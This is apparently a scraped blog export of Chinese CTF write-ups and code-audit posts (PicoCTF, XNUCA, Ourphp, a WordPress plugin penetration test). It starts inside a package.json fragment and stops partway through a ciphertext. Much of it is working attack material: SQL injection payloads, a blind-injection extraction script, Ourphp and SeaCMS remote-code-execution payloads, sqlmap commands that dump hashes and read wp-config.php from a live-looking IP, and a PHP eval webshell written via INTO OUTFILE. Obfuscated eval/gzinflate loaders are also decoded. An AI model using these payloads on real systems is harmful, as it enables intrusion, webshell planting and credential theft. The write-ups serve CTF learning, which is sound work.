&quot;body-parser&quot;: &quot;^1.16.0&quot;, &quot;callsite&quot;: &quot;^1.0.0&quot;, &quot;clone&quot;: &quot;^2.1.0&quot;, &quot;colors&quot;: &quot;^1.1.2&quot;, &quot;cookie-parser&quot;: &quot;^1.4.3&quot;, &quot;deep-diff&quot;: &quot;^0.3.4&quot;, &quot;dequeue&quot;: &quot;^1.0.5&quot;, &quot;express&quot;: &quot;^4.14.1&quot;, &quot;mongodb&quot;: &quot;^2.2.25&quot;, &quot;morgan&quot;: &quot;^1.7.0&quot;, &quot;nconf&quot;: &quot;^0.8.4&quot;, &quot;promise&quot;: &quot;^7.1.1&quot;, &quot;socket.io&quot;: &quot;^1.7.2&quot;, &quot;sprintf&quot;: &quot;^0.1.5&quot; &#125;, &quot;devDependencies&quot;: &#123;&#125;, &quot;scripts&quot;: &#123; &quot;prestart&quot;: &quot;node server/init.js&quot;, &quot;start&quot;: &quot;node server/serv.js&quot; &#125;&#125; CRYPTOGRAPHYSoRandom题目：12345We found sorandom.py running at shell2017.picoctf.com:37968. It seems to be outputting the flag but randomizing all the characters first. Is there anyway to get back the original flag?Update (text only) 16:16 EST 1 Apr Running python 2 (same version as on the server) HINTS How random can computers be? 加密脚本1234567891011121314151617#!/usr/bin/python -uimport random,stringflag = \"FLAG:\"+open(\"flag\", \"r\").read()[:-1]encflag = \"\"random.seed(\"random\")for c in flag: if c.islower(): #rotate number around alphabet a random amount encflag += chr((ord(c)-ord('a')+random.randrange(0,26))%26 + ord('a')) elif c.isupper(): encflag += chr((ord(c)-ord('A')+random.randrange(0,26))%26 + ord('A')) elif c.isdigit(): encflag += chr((ord(c)-ord('0')+random.randrange(0,10))%10 + ord('0')) else: encflag += cprint \"Unguessably Randomized Flag: \"+encflag 在终端nc题目给出的端口，返回了BNZQ:jn0y1313td7975784y0361tp3xou1g44 加密脚本看似是生成的随机数，但是用了seed()函数，那么生成的随机数序列一定是固定的，那么只需要逆序就好了，这里注意python随机数在windows和linux下是不同的，这个脚本要放在linux下跑。 解密脚本1234567891011121314151617#!/usr/bin/python -uimport random,stringflag = \"\"encflag = \"BNZQ:jn0y1313td7975784y0361tp3xou1g44\"random.seed(\"random\")for c in encflag: if c.islower(): #rotate number around alphabet a random amount flag += chr((ord(c)-ord('a')+26-random.randrange(0,26))%26 + ord('a')) elif c.isupper(): flag += chr((ord(c)-ord('A')+26-random.randrange(0,26))%26 + ord('A')) elif c.isdigit(): flag += chr((ord(c)-ord('0')+10-random.randrange(0,10))%10 + ord('0')) else: flag += cprint flag flag：FLAG:ac8c0490fb0508767f1625cb8cea8c34","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"Ourphp后台getshell漏洞","date":"2017-09-17T16:00:00.000Z","path":"2017/09/18/Ourphp后台getshell漏洞/","text":"0x00 Payload1/client/manage/ourphp_filebox.php?op=save&amp;encode=UTF-8&amp;fename=1.php&amp;ncontent=&lt;?php phpinfo(); ?&gt; 在登陆后台后，可直接上传文件。 代码分析/ourphp/client/manage/ourphp_filebox.php 694行 1234567891011121314151617181920212223function save($ncontent, $fename, $encode) &#123; global $meurl,$folder; if (!$fename == \"\") &#123; maintop(\"编辑\"); $file = iconv(\"UTF-8\", \"GBK\", $folder.$fename); $ydata = stripslashes($ncontent); if($encode!==\"UTF-8\" &amp;&amp; $encode!==\"ASCII\")&#123; $ydata = iconv($encode, \"UTF-8\", $ydata); &#125; if(file_put_contents($file, $ydata)) &#123; echo \"&lt;div class='box'&gt;文件 &lt;a href=\\\"\".$folder.$fename.\"\\\" target=\\\"_blank\\\"&gt;\".$folder.$fename.\"&lt;/a&gt; 保存成功！\\n\" .\"请选择 &lt;a href=\\\"\".$meurl.\"?op=home&amp;folder=\".$_SESSION['folder'].\"\\\"&gt;返回文件管理&lt;/a&gt; 或者 &lt;a href=\\\"\".$meurl.\"?op=edit&amp;fename=\".$fename.\"&amp;folder=\".$folder.\"\\\"&gt;继续编辑&lt;/a&gt;&lt;/div&gt;\\n\"; $fp = null; &#125;else&#123; echo \"&lt;span class='error'&gt;文件保存出错！&lt;/span&gt;\\n\" .\" &lt;a href=\\\"\".$meurl.\"?op=home&amp;folder=\".$_SESSION['folder'].\"\\\"&gt;返回文件管理&lt;/a&gt;\\n\"; &#125; &#125;else&#123; home(); &#125;&#125; 函数调用位置:12345switch ($op)&#123; …… case \"save\": save($_REQUEST['ncontent'], $_REQUEST['fename'], $_REQUEST['encode']); break; op参数位置：123456if(isset($_REQUEST['op']))&#123; $op = $_REQUEST['op']; session_start(); &#125;else&#123; $op = 'home';&#125; 所有参数全部都是request到的，也没有经过过滤函数，就直接拼接到了字符串中，进行了文件读写，保存。 CNVD-2017-13894是前台漏洞，但是我并没有找到如何绕过验证。1234567891011if (@$_GET['validation'] == $ourphp['validation'] &amp;&amp; $_GET['code'] == $ourphp['safecode'])&#123; $_SESSION['ourphp_outtime'] = time() + 3600; $_SESSION['ourphp_out'] = \"ourphp\"; &#125;else&#123; if(isset($_SESSION['ourphp_out']))&#123; $filefolder = str_replace('\\\\','/',WEB_ROOT.$ourphp['webpath']); &#125;else&#123; include 'ourphp_checkadmin.php'; $filefolder = str_replace('\\\\','/',WEB_ROOT.$ourphp['webpath'].\"templates/\"); &#125;&#125; 这里验证了validation和safecode，validation是ourphp的口令码，safecode是随机生成的32位的安全码，如果有这两个字符串也可以绕过验证。","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"}]},{"title":"PicoCTF Level3 WriteUp","date":"2017-09-17T16:00:00.000Z","path":"2017/09/18/PicoCTF-level3-WriteUp/","text":"WebBiscuit打开题目，显示Access Denied，还有姜饼人的背景。 查看源代码，其中有注释。12&lt;!-- Storing stuff in the same directory as your web server doesn&apos;t seem like a good idea --&gt;&lt;!-- Thankfully, we use a hidden one that is super PRIVATE, to protect our cookies.sqlite file --&gt; 提示我们去访问/private/cookies.sqlite文件。 下载到了cookies.sqlite，sqlite是一种轻型的数据库，要用sqlite3去打开他。sqlite下载 1234E:\\tools\\sqlite-tools-win32-x86-3200000&gt;sqlite3.exe cookies.sqliteSQLite version 3.20.0 2017-08-01 13:24:15Enter &quot;.help&quot; for usage hints.sqlite&gt; 然后根据sqlite的数据库结构查询cookie的值。12345sqlite&gt; SELECT * FROM sqlite_master WHERE type=&apos;table&apos;;table|moz_cookies|moz_cookies|2|CREATE TABLE moz_cookies (id INTEGER PRIMARY KEY, baseDomain TEXT, appId INTEGER DEFAULT 0, inBrowserElement INTEGER DEFAULT 0, name TEXT, value TEXT, host TEXT, path TEXT, expiry INTEGER, lastAccessed INTEGER, creationTime INTEGER, isSecure INTEGER, isHttpOnly INTEGER, CONSTRAINT moz_uniqueid UNIQUE (name, host, path, appId, inBrowserElement))sqlite&gt; SELECT * FROM moz_cookies;1|localhost|0|0|ID|F3MAqpWxIvESiUNLHsflVd|localhost|/|1489365457|1489279130600290|1489279057101857|0|0 F3MAqpWxIvESiUNLHsflVd就是数据库中存储的cookie中id的值。 将访问时的cookie修改成对应的，就可以得到flag。 flag：a31bbaad652b861dec1cdf7a7fe9fc9d A Happy Union1234I really need access to website, but I forgot my password and there is no reset. Can you help? I like lite sql :) HINTS A SQL union allows a single query to select values from multiples tables. 题目是一个登陆，注册界面，题目是A Happy Union，猜测要用到union select 注入，题目说忘记了自己的密码，也就是说我们要查询的是user的password，I like lite sql这句可能是在提示用的是sqlite的数据库。 从注册账号入手，随便注册了一个。看到有三个显示的位置。 测试一下sql语句。12username:&apos;or 1=1password:111 sql语句完全没有过滤，被直接插入了查询语句中。1select id, user, post from posts where user = &apos;&apos; or 1=1&apos;; sqlite数据库中有一个sqlite_master的表，储存了所有表的索引，我们select查询他就能获得表名。 12username:&apos; UNION SELECT null,null,name From sqlite_master ; --password:111 有三个显示位，所以要用null来控制。这样sql语句就是1select id, user, post from posts where user = &apos;&apos; UNION SELECT null,null,name From sqlite_master ; --&apos; 和想象的一样，直接查询user和pass了。12username:&apos; UNION SELECT user,pass,null From users ; --password:111 flag:flag{union?_why_not_onion_a69464d4869c743e26c08df8686e4003} No Eyes1234The website isn&apos;t really me much, but you can still get the admin password, right? HINTS Sometimes an error message can be just as useful. 这次的题目没有了注册页面，只有登陆，先测试。 输入admin，admin，返回Incorrect Password. 输入aaadmin，admin，返回User not Found. 输入admin&#39;，admin，请求错误，并返回了sql语句。 1select * from users where user = &apos;admin&apos;&apos;; 题目是no eyes，可以利用bool型盲注。 利用length函数查询pass的长度。1admin&apos; and length(pass)=63; -- 返回Incorrect Password. 直接利用python脚本。123456789101112131415161718192021222324#-*-coding:utf-8-*-import requests import timeurl = 'http://shell2017.picoctf.com:40788/' def check(payload): postdata=&#123;'username':payload,'password':'11'&#125; #print url1 r = requests.post(url,postdata).content #print r return 'Incorrect Password.' in rflag=''s = r'1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#123;&#125;'for i in xrange(1,64): for c in s: payload = 'admin\\' AND substr((pass),'+str(i)+',1)=\\''+c+'\\'; --' #print payload if check(payload): flag += c break print flag flag：not_all_errors_should_be_shown_3c826cdcbf6f146ac6f86e6b65d3b1de ###","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"Wordpress插件渗透测试","date":"2017-09-17T16:00:00.000Z","path":"2017/09/18/Wordpress插件渗透测试/","text":"0x00 信息收集网址是一个wordpress博客。1Apache/2.4.10 (Debian) 既然是wp，直接用wpscan扫一扫。123456789101112131415161718[+] We found 2 plugins:[+] Name: akismet | Latest version: 3.3.4 | Location: http://218.2.197.234:2040/wp-content/plugins/akismet/[!] We could not determine a version so all vulnerabilities are printed out[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS) Reference: https://wpvulndb.com/vulnerabilities/8215 Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/ Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html[i] Fixed in: 3.1.5[+] Name: wp-symposium - v15.1 | Location: http://218.2.197.234:2040/wp-content/plugins/wp-symposium/ | Readme: http://218.2.197.234:2040/wp-content/plugins/wp-symposium/readme.txt[!] The version is out of date, the latest version is 15.8.1 找到了两个“过气”插件，存在漏洞。12345678910111213141516171819[!] Title: WP Symposium &lt;= 15.1 - SQL Injection Reference: https://wpvulndb.com/vulnerabilities/7902 Reference: http://permalink.gmane.org/gmane.comp.security.oss.general/16479 Reference: http://packetstormsecurity.com/files/131801/ Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3325 Reference: https://www.exploit-db.com/exploits/37080/[i] Fixed in: 15.4[!] Title: WP Symposium &lt;= 15.5.1 - Unauthenticated SQL Injection Reference: https://wpvulndb.com/vulnerabilities/8140 Reference: https://plugins.trac.wordpress.org/changeset/1214872/wp-symposium Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6522 Reference: https://www.exploit-db.com/exploits/37824/[i] Fixed in: 15.8[!] Title: WP Symposium &lt;= 15.1 - Blind SQL Injection Reference: https://wpvulndb.com/vulnerabilities/8148 Reference: https://security.dxw.com/advisories/blind-sql-injection-in-wp-symposium-allows-unauthenticated-attackers-to-access-sensitive-data/[i] Fixed in: 15.8 0x01 漏洞利用CVE-2015-3325的sql注入是利用wp-symposium插件中的get_album_item.php。12345678910&lt;?php include_once('../../../wp-config.php'); global $wpdb; $iid = $_REQUEST['iid']; $size = $_REQUEST['size']; $sql = \"SELECT \".$size.\" FROM \".$wpdb-&gt;base_prefix.\"symposium_gallery_items WHERE iid = %d\"; $image = $wpdb-&gt;get_var($wpdb-&gt;prepare($sql, $iid)); header(\"Content-type: image/jpeg\"); echo stripslashes($image);?&gt; 构造size参数，来进行sql查询，代码也没有过滤，但是在查询列名限制table_name的时候却没有返回，如果不限制table_name，会因为文件大小限制只显示1kb的内容，看不到wp_users的列名。1?size=group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() and table_name=%27users%27%20;%20-- 无奈，放弃这个漏洞，看那个盲注的CVE。 https://www.exploit-db.com/exploits/37822/ topic_id参数存在盲注，访问对应页面，将post请求保存到文件中，用sqlmap来测试。(测试的时候没有删掉exp中的sleep函数，导致脚本多跑了好久。。。) 1sqlmap -r &quot;E:\\1.txt&quot; --dbs --level 3 12345available databases [4]:[*] information_schema[*] mysql[*] performance_schema[*] wordpress 表名1sqlmap -r &quot;E:\\1.txt&quot; -D &quot;wordpress&quot; --tables 12345678910111213141516171819202122232425262728293031323334353637383940Database: wordpress[36 tables]+------------------------------+| wp_commentmeta || wp_comments || wp_links || wp_options || wp_postmeta || wp_posts || wp_symposium_audit || wp_symposium_cats || wp_symposium_chat2 || wp_symposium_chat2_typing || wp_symposium_chat2_users || wp_symposium_comments || wp_symposium_events || wp_symposium_events_bookings || wp_symposium_extended || wp_symposium_following || wp_symposium_friends || wp_symposium_gallery || wp_symposium_gallery_items || wp_symposium_group_members || wp_symposium_groups || wp_symposium_likes || wp_symposium_lounge || wp_symposium_mail || wp_symposium_news || wp_symposium_styles || wp_symposium_subs || wp_symposium_topics || wp_symposium_topics_images || wp_symposium_topics_scores || wp_symposium_usermeta || wp_term_relationships || wp_term_taxonomy || wp_terms || wp_usermeta || wp_users |+------------------------------+ 列名1sqlmap -r &quot;E:\\1.txt&quot; -D &quot;wordpress&quot; -T &quot;wp_users&quot; --columns 1234567891011121314151617Database: wordpressTable: wp_users[10 columns]+---------------------+---------------------+| Column | Type |+---------------------+---------------------+| display_name | varchar(250) || ID | bigint(20) unsigned || user_activation_key | varchar(60) || user_email | varchar(100) || user_login | varchar(60) || user_nicename | varchar(50) || user_pass | varchar(64) || user_registered | datetime || user_status | int(11) || user_url | varchar(100) |+---------------------+---------------------+ 查询内容1sqlmap -r &quot;E:\\1.txt&quot; -D &quot;wordpress&quot; -T &quot;wp_users&quot; -C &quot;user_pass&quot; --dump 12345+------------------------------------+| user_pass |+------------------------------------+| $P$BoRvgt/kaEDWqyiq0a3U8QjUQAO6gQ0 |+------------------------------------+ 用CVE-2015-3325按照对应的表名列名也是能查到管理员。1?size=group_concat(user_nicename,0x7e,user_pass) FROM wp_users%20;%20-- 但是数据库中的管理员密码是强加密的，没办法解密。 之前扫到服务器还有一个phpmyadmin网页，可以从这里入手。 用sqlmap扫描phpmyadmin的密码。1sqlmap -r &quot;E:\\1.txt&quot; --current-user --password 1234567database management system users password hashes:[*] debian-sys-maint [1]: password hash: *AA59232D46C9C0751BA3069045A0B90F3C6431C4[*] root [1]: password hash: *74ACCF7FB15CDBAEE88B9E7F7B58352D3308CFF2[*] wordpress [1]: password hash: *A22BD9F95BF505E792C556FC1EF9FCFA6B6B5D9B 也是没有办法解密。。。 经过表哥提示，直接利用sqlmap读取wp的配置文件。 1sqlmap -r &quot;E:\\1.txt&quot; --file-read &quot;/var/www/html/wp-config.php&quot; -p &quot;topic_id&quot; 成功读取到phpmyadmin的账户密码。 Getshell登陆到phpmyadmin，通过sql查询语句写入shell。1select '&lt;?php @eval($_POST[adadminn])?&gt;'INTO OUTFILE '/var/www/html/nibuhuicaidao.php'; 报错：Can&#39;t create/write to file &#39;/var/www/html/nibuhuicaidao.php&#39; (Errcode: 13) 提示目录不可写。 用dirbuster工具爆破了一下目录，发现还有一个image的目录，测试，发现可写。 1select '&lt;?php @eval($_POST[adadminn])?&gt;'INTO OUTFILE '/var/www/html/images/nibuhuicaidao.php'; 菜刀链接，拿到flagflag{Hi_Web_fLaG_Is_HEre}。","tags":[{"name":"Web","slug":"Web","permalink":"http://yoursite.com/tags/Web/"},{"name":"渗透测试","slug":"渗透测试","permalink":"http://yoursite.com/tags/渗透测试/"}]},{"title":"XNUCA-Writeup","date":"2017-09-17T16:00:00.000Z","path":"2017/09/18/XNUCA-Writeup/","text":"#No.8 看视频真嗨皮（读：50分，写：100分）1234提交关键字词：一档靶标题===============================================================周末看个电影放松一下吧！ 海洋cms v6.45前台getshell漏洞payload：12url：http://6f781364dedf5dc1eb877079f415877b.xnuca.cn/search.php?searchtype=5&amp;tid=0&amp;year=23334444);assert($_POST[1]);//post:searchword=d&amp;order=&#125;&#123;end if&#125;&#123;if:1)print_r($_POST[func]($_POST[cmd]));//&#125;&#123;end if&#125;&amp;func=assert&amp;cmd=phpinfo(); phpinfo()正常执行。 通过system函数执行命令。找flag位置查询flag创建文件 #No.23 找入口（读：100分，写：200分）1234提交关键字词：二档靶标题===============================================================本站的基本职能是什么 找到网站后台，发现后台是弱口令username=admin&amp;password=admin。 wolfcms 任意文件上传 后台直接上传shell，根据前台的logo找到对应的路径。 按照上一题的套路查看flag，写文件。 第三轮0x00信息收集####操作内容根据提示，访问main.js，找到作者信息1234567/* * main.js v1.0 * * 2017/5/20 * author l1Kai@youngin.uu.me * */ github找到作者https://github.com/l1Kai/user 获得config.php和flag123&lt;?php $payload=\"fVJNc9sgEP1BuUhOPC2HHmxsbJBCDAgkc5NRJCtCHx3HVsivL5aTaZtDDgwDu++93be7Yj2FHbEmU4NpZZ+FYC0UKTP30MUzHR5aGuQpOMfdsjfQDE9jEK3Y0OhUDwefjxsOxRokCuITflk76h7G+GVxfhR4ytUb1ebp3EawWDOrEq5wF0PTRcmJwpZb3dqzFlXH14QxRRPixo645se/GiTgMGkQ5cKciDNfeUUSAMkRIcS9lVnAibSgjGt8ieuHC67/58K2QMwCKRR/5AKfyF1eHe/auoVfeQmTDShFoDSuxzqq+9+e7+x5hyf384K3Ra8zYvHGvmO0FEkIYq6aaucWFFZBlKf7KoKo0xkvDynq8pSW3uNLsVHv2awY964aIhZEz14Tw0XleVoMq6NOw7HYNj1BYMsVm3Km+Nb7Vfsb3s5HvMKroNqnvDGzt6OZHa0Jge9VjRHkJQ+UnHyecEuwYv2E/ajNHrJl8CyqJguXOxl+q8WSkMrvtOS0A1evbxolu+5J/4lf+RnFQsrrG+ANavSWnvYZ9R7S0ntuDfR1BHSXBK+Ei788Hiu4Qoorr/8dNiRIKoWufVzneNMfnM5QmPs5RYjskpCvZdOciQMX05qLmYVH0/F5HNLXfUa8F/OXwwa9Gzcf8+3itqMdteaeDofZvDT33Oezfvr3M9bZcShWp19/AA==\";preg_replace('/.*/e',\"\\x65\\x76\\x61\\x6c\\x28\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x67\\x7a\\x69\\x6e\\x66\\x6c\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x34\\x5f\\x64\\x65\\x63\\x6f\\x64\\x65\\x28\\x24\\x70\\x61\\x79\\x6c\\x6f\\x61\\x64\\x29\\x2c\\x30\\x29\\x29\\x29\",'.'); ?&gt;flag&#123;e76cd8c1-d747-4259-aaac-bc36efe62462&#125; FLAG值flag{e76cd8c1-d747-4259-aaac-bc36efe62462} 0x01信息分析操作内容用python输出\\x部分。 eval(base64_decode(gzinflate(base64_decode($payload),0))) php解密1234&lt;?php $payload=\"fVJNc9sgEP1BuUhOPC2HHmxsbJBCDAgkc5NRJCtCHx3HVsivL5aTaZtDDgwDu++93be7Yj2FHbEmU4NpZZ+FYC0UKTP30MUzHR5aGuQpOMfdsjfQDE9jEK3Y0OhUDwefjxsOxRokCuITflk76h7G+GVxfhR4ytUb1ebp3EawWDOrEq5wF0PTRcmJwpZb3dqzFlXH14QxRRPixo645se/GiTgMGkQ5cKciDNfeUUSAMkRIcS9lVnAibSgjGt8ieuHC67/58K2QMwCKRR/5AKfyF1eHe/auoVfeQmTDShFoDSuxzqq+9+e7+x5hyf384K3Ra8zYvHGvmO0FEkIYq6aaucWFFZBlKf7KoKo0xkvDynq8pSW3uNLsVHv2awY964aIhZEz14Tw0XleVoMq6NOw7HYNj1BYMsVm3Km+Nb7Vfsb3s5HvMKroNqnvDGzt6OZHa0Jge9VjRHkJQ+UnHyecEuwYv2E/ajNHrJl8CyqJguXOxl+q8WSkMrvtOS0A1evbxolu+5J/4lf+RnFQsrrG+ANavSWnvYZ9R7S0ntuDfR1BHSXBK+Ei788Hiu4Qoorr/8dNiRIKoWufVzneNMfnM5QmPs5RYjskpCvZdOciQMX05qLmYVH0/F5HNLXfUa8F/OXwwa9Gzcf8+3itqMdteaeDofZvDT33Oezfvr3M9bZcShWp19/AA==\"; echo (base64_decode(gzinflate(base64_decode($payload),0)));?&gt; 得到config.php123456789101112131415161718192021222324252627282930require(__DIR__.'/function.php');define(\"DBHOST\",\"127.0.0.1\");define('DBUSER','');define('DBPASS','');define('DBNAME','');define('ROOTDRI',__DIR__.\"/../\");define(\"WEB_TITLE\",'标题');define(\"PRO_KEY\",\"***....\");// where is PRO_KEY ? if (!get_magic_quotes_gpc())&#123; if (!empty($_GET)) &#123; $_GET = addslashes_deep($_GET); &#125; if (!empty($_POST)) &#123; $_POST = addslashes_deep($_POST); &#125; $_COOKIE = addslashes_deep($_COOKIE); $_REQUEST = addslashes_deep($_REQUEST);&#125;require(ROOTDRI.'/org/smarty/Smarty.class.php');session_start();exit; 查看之前的历史提交，找到最初的config.php，修改php输出执行的内容。123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpfunction _rZBFc5($_AXxuMn)&#123; $keyStr = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\"; $chr1 = $chr2 = $chr3 = \"\"; $enc1 = $enc2 = $enc3 = $enc4 = \"\"; $i = 0; $output = \"\"; $_AXxuMn = preg_replace(\"[^A-Za-z0-9\\\\+\\\\/\\\\=]\", \"\", $_AXxuMn); do &#123; $enc1 = strpos($keyStr, substr($_AXxuMn, $i++, 1)); $enc2 = strpos($keyStr, substr($_AXxuMn, $i++, 1)); $enc3 = strpos($keyStr, substr($_AXxuMn, $i++, 1)); $enc4 = strpos($keyStr, substr($_AXxuMn, $i++, 1)); $chr1 = $enc1 &lt;&lt; 2 | $enc2 &gt;&gt; 4; $chr2 = ($enc2 &amp; 15) &lt;&lt; 4 | $enc3 &gt;&gt; 2; $chr3 = ($enc3 &amp; 3) &lt;&lt; 6 | $enc4; $output = $output . chr((int) $chr1); if ($enc3 != 64) &#123; $output = $output . chr((int) $chr2); &#125; if ($enc4 != 64) &#123; $output = $output . chr((int) $chr3); &#125; $chr1 = $chr2 = $chr3 = \"\"; $enc1 = $enc2 = $enc3 = $enc4 = \"\"; &#125; while ($i &lt; strlen($_AXxuMn)); return $output;&#125;function _g1S4Ve($_XJwGpK)&#123; return _rZBFc5($_XJwGpK);&#125;function _Xvtafz($_4LYEpc)&#123; return gzinflate($_4LYEpc, 0);&#125;function _ehljDM($_j045Zz)&#123; return eval($_j045Zz);&#125;$_Za0oXi = \"fVNNk6IwEP1BcwHU2uWwBw2gCZidhBAgN4zDhwkfVY4y+Os34kzt7hw8pFKp7vde9+uOR/pr2Gzawzbo3m7KwaeNym9kjNh6wjf4jj3aCmDXe4/YERMat/koTmopWlzvd1YVNj8x6JCWGR9km/SZ7foxR2U2LbvIEfahxVaRupeo2/QSyOH3aIUeGZRIxXAw+VBREPsu4wCe4cmf8LQco9P6so/hnCu2vC3SlQ7B0SeaM8phFwHZheyMQUu1aPVFxFVHfUQIxwxNY4cm9eNfDWRRwFSAaSzPaJLfeWNmuQkNEELTR5lZFCXaLaMGXqNmeYXN/1xQHwOi3STmdE9jeEYvRVW/tE0LvvMikii3jC0uYDM2e7Ze7NN8iR3e5E4+iRaujI+OOPkLvOWnnAVaMKSElzdzb5UVFmlehSDoREbLQxp0RYpL4/P1uOW3zDmO+VQNIbHCN6MLwbqCW91CUNUitcfjTvUocHeUkzlnju8Mb2Nu8Dif8Qp6VpWnVEnno5ZOraXtmn75GAJaUosncz0zbuN6pJ+xn7XpQ7ax3uJKZfbmNbGfahFm4+SZVjLvwd3vh0ZJ7rvSf+E9M6coTpL724XbQIkdPucZ7kWGS+O7lsDUYeFXZr0jGv/lMdiY8oBTbvSfYW0UJJwH9z7us3zoD5PIArvIkA4D9Mps6idKXdDkXmUrr9Kxa9nRVWTj9zxDxovVyfylm5xWY7FbP/a0w1ou8HBwVqVcUJNP+q8Zi6wejt751x8=\";echo _g1S4Ve(_Xvtafz(_g1S4Ve($_Za0oXi),0))?&gt; 得到flag12345678910111213141516171819202122232425262728293031/* flag&#123;9660dc40-0272-44fd-a045-6e6f0f98fca0&#125; */require(__DIR__.'/function.php');define(\"DBHOST\",\"127.0.0.1\");define('DBUSER','');define('DBPASS','');define('DBNAME','');define('ROOTDRI',__DIR__.\"/../\");define(\"WEB_TITLE\",'标题');define(\"PRO_KEY\",\"1071f87ebcf2fb9f96f174eca1ee2dd6\");if (!get_magic_quotes_gpc())&#123; if (!empty($_GET)) &#123; $_GET = addslashes_deep($_GET); &#125; if (!empty($_POST)) &#123; $_POST = addslashes_deep($_POST); &#125; $_COOKIE = addslashes_deep($_COOKIE); $_REQUEST = addslashes_deep($_REQUEST);&#125;require(ROOTDRI.'/org/smarty/Smarty.class.php');session_start();exit; FLAG值flag{9660dc40-0272-44fd-a045-6e6f0f98fca0} 0x02开始渗透操作内容github上的项目名为user，访问user目录，提示登陆。 根据登陆页面，用户名是邮箱，根据给出提示猜测密码。 邮箱为github邮箱，密码为likai，得到flag。 FLAG值flag{cc498da1-3918-48be-b9e2-c64c69a5349e}","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"PicoCTF Level1 WriteUp","date":"2017-09-17T16:00:00.000Z","path":"2017/09/18/PicoCTF-level1-WriteUp/","text":"在表哥的推荐下接触了PicoCTF，记录一下自己的解题思路 TutorialTutorial 1给了一个list，找出Robin Morris的中间名，直接搜索，找到Robin Almay Morris Tutorial 2打开链接1234Hey, checkout this super secret message I made, using this cool ROT13cipher I found online!Lb, fb unir lbh orra cynlvat gung arj Zrfbcrgf tnzr? Gubfr arj Zrtnybalpuvqnr naq Oenqlcbqvqnr gurl nqqrq ner cerggl pbby. Npghnyyl, V jbhyq tb nf sne nf fnlvat gung vg vf abj zl yvsr&apos;f qrnerfg nzovgvba gb bognva n &quot;Vasyngnoyr Fybgu Zbafgre&quot;! 直接给出了rot13的提示，解密1Yo, so have you been playing that new Mesopets game? Those new Megalonychidae and Bradypodidae they added are pretty cool. Actually, I would go as far as saying that it is now my life&apos;s dearest ambition to obtain a &quot;Inflatable Sloth Monster&quot;! flag就是Inflatable Sloth Monster Tutorial 3123456789These are a few of my favorite things!7A3B006000C767C70042FFFCC700020003C7007A78 找出红色的值即可，工具：http://www.atool.org/colorpicker.phpflag:C70002 Level1WebWhat Is Web类似于入门的查看源代码的题目，flag分为3部分。123html中：&lt;!-- The first part of the flag (there are 3 parts) is fab79c49d9e --&gt;css中：The second part of the flag is 5ba511a0f24 js中： * The final part of the flag is 36308e33e85 拼起来就是flag：fab79c49d9e5ba511a0f2436308e33e85 ReverseHex2Raw在旁边的CLI窗口中cd对应的文件夹，ls，发现了hex2raw。123456$ ./hex2rawGive me this in raw form (0x41 -&gt; &apos;A&apos;): 416f1c7918f83a4f1922d86df5e78348 You gave me: 题目叫hex to raw，那么传递的字符串应该是hex解码的，运动python的decode()函数。123456789$ python -c &quot;print(&apos;416f1c7918f83a4f1922d86df5e78348&apos;.decode(&apos;hex&apos;))&quot;| ./hex2rawGive me this in raw form (0x41 -&gt; &apos;A&apos;):416f1c7918f83a4f1922d86df5e78348 You gave me: 416f1c7918f83a4f1922d86df5e78348 Yay! That&apos;s what I wanted! Here be the flag: 1d2411efe307f5ac07bd28bbabb5769e flag：1d2411efe307f5ac07bd28bbabb5769e Raw2Hex一开始跟上一题相同，但是出现的是一堆乱码，题目是raw to hex，运用linux自带的xxd命令就可以输出hex编码后的字符串。12$ ./raw2hex | xxd-p 54686520666c61672069733aff9a4fdb6995b557590a742b0e685bd3 flag：54686520666c61672069733aff9a4fdb6995b557590a742b0e685bd3xxd命令：http://www.360doc.com/content/12/1228/14/3038654_256776082.shtml Forensics###Digital Camouflage题目给了一个pcap文件，直接用wireshark打开，提取所有的html文件找到了main.htmluserid=spiveyp&amp;pswrd=S04xWjZQWFZ5OQ%3D%3D对pswrd urldecode 得到S04xWjZQWFZ5OQ== 双等号，大小写，base64解密，得到flag。flag：KN1Z6PXVy9 Special Agent User同上题一样给了一个pcap文件，这题提示找http头的User-agent中的浏览器名字和版本，直接筛选http协议部分查看，得到flag。flag：Special Agent User CryptographySubstitute1234A wizard (he seemed kinda odd...) handed me this. Can you figure out what it says? HINTS There are tools that make this easy this. 1MIT YSAU OL OYGFSBDGRTKFEKBHMGCALSOQTMIOL. UTFTKAMTR ZB DAKQGX EIAOF GY MIT COQOHTROA HAUT GF EASXOF AFR IGZZTL. ZT CTKT SGFU, MIT YSACL GF A 2005 HKTLTFM MODTL MIAF LMADOFA GK A CTTQSB LWFRAB, RTETDZTK 21, 1989 1990, MIT RKTC TROMGKL CAL WHKGGMTR TXTKB CGKSR EAF ZT YGWFR MIT EGFMOFWTR MG CGKQ AM A YAOMIYWS KTHSOTL CITKT IGZZTL, LMBST AOD EASXOF, AMMAEQ ZGMI LORTL MG DAKQL, &quot;CIAM RG EGFMKGSSOFU AF AEMWAS ZGAKR ZGVTL OF MIT HKTHAKTFML FADT, OL ODHWSLOXT KADHAUTL OF CIOEI ASCABL KTYTKTFETL MIT HALLCGKR, 